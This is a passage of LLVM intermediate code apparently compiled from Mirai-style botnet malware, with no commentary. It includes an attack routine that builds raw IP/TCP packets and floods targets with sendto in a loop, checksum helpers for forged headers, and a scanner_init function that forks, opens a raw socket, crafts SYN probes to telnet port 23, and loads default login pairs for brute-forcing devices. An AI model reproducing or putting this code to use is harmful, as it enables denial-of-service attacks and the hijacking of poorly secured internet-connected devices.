  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !4

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !6

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !7

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 28)
  %4 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  %5 = tail call i8* @table_retrieve_val(i32 28, i32* null)
  %6 = call i8* @strcpy(i8* nonnull %4, i8* %5) #10
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %8, %.lr.ph ], [ %1, %.lr.ph.preheader ]
  %.012 = phi i8* [ %11, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %8 = add nsw i32 %.03, -1
  %9 = call i32 @util_strlen(i8* nonnull %4) #10
  %10 = load i8, i8* %4, align 16
  %11 = getelementptr inbounds i8, i8* %.012, i64 1
  store i8 %10, i8* %.012, align 1
  %12 = icmp eq i32 %8, 0
  br i1 %12, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() local_unnamed_addr #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set.28, align 8
  %3 = alloca %struct.fd_set.28, align 8
  %4 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %4 to %struct.timeval.29*
  %5 = alloca [1514 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = tail call i32 @fork() #10
  store i32 %13, i32* @scanner_pid, align 4
  %14 = icmp sgt i32 %13, 0
  %15 = icmp eq i32 %13, -1
  %or.cond = or i1 %14, %15
  br i1 %or.cond, label %16, label %17

; <label>:16:                                     ; preds = %0
  ret void

; <label>:17:                                     ; preds = %0
  %18 = tail call i32 @util_local_addr() #10
  store i32 %18, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init() #10
  %19 = tail call i64 @time(i64* null) #10
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @fake_time, align 4
  %21 = tail call noalias i8* @calloc(i64 256, i64 296) #10
  store i8* %21, i8** bitcast (%struct.scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  %.cast = bitcast i8* %21 to %struct.scanner_connection*
  br label %22

; <label>:22:                                     ; preds = %22, %17
  %indvars.iv247 = phi i64 [ 0, %17 ], [ %indvars.iv.next248.7, %22 ]
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv247, i32 1
  store i32 -1, i32* %23, align 8
  %indvars.iv.next248 = or i64 %indvars.iv247, 1
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248, i32 1
  store i32 -1, i32* %24, align 8
  %indvars.iv.next248.1 = or i64 %indvars.iv247, 2
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.1, i32 1
  store i32 -1, i32* %25, align 8
  %indvars.iv.next248.2 = or i64 %indvars.iv247, 3
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.2, i32 1
  store i32 -1, i32* %26, align 8
  %indvars.iv.next248.3 = or i64 %indvars.iv247, 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.3, i32 1
  store i32 -1, i32* %27, align 8
  %indvars.iv.next248.4 = or i64 %indvars.iv247, 5
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.4, i32 1
  store i32 -1, i32* %28, align 8
  %indvars.iv.next248.5 = or i64 %indvars.iv247, 6
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.5, i32 1
  store i32 -1, i32* %29, align 8
  %indvars.iv.next248.6 = or i64 %indvars.iv247, 7
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.6, i32 1
  store i32 -1, i32* %30, align 8
  %indvars.iv.next248.7 = add nsw i64 %indvars.iv247, 8
  %exitcond.7 = icmp eq i64 %indvars.iv.next248.7, 256
  br i1 %exitcond.7, label %31, label %22

; <label>:31:                                     ; preds = %22
  store i32 256, i32* %1, align 4
  %32 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  store i32 %32, i32* @rsck, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %31
  tail call void @exit(i32 0) #12
  unreachable

; <label>:35:                                     ; preds = %31
  %36 = tail call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0) #10
  %37 = or i32 %36, 2048
  %38 = tail call i32 (i32, i32, ...) @fcntl(i32 %32, i32 4, i32 %37) #10
  store i32 1, i32* %1, align 4
  %39 = load i32, i32* @rsck, align 4
  %40 = bitcast i32* %1 to i8*
  %41 = call i32 @setsockopt(i32 %39, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %.preheader215, label %45

.preheader215:                                    ; preds = %35
  %43 = call zeroext i16 @ntohs(i16 zeroext 0) #11
  %44 = icmp ult i16 %43, 1024
  br i1 %44, label %.preheader215.split.preheader, label %.split

.preheader215.split.preheader:                    ; preds = %.preheader215
  br label %.preheader215.split

; <label>:45:                                     ; preds = %35
  %46 = load i32, i32* @rsck, align 4
  %47 = call i32 @close(i32 %46) #10
  call void @exit(i32 0) #12
  unreachable

.preheader215.split:                              ; preds = %.preheader215.split.preheader, %.preheader215.split
  br label %.preheader215.split

.split:                                           ; preds = %.preheader215
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), align 16
  %48 = call zeroext i16 @htons(i16 zeroext 40) #11
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 9), align 1
  %49 = call zeroext i16 @htons(i16 zeroext 23) #11
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %50 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = and i16 %50, -753
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %52 = or i16 %51, 592
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i16 zeroext 14)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i16 zeroext 11)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), i16 zeroext 17)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i16 zeroext 8)
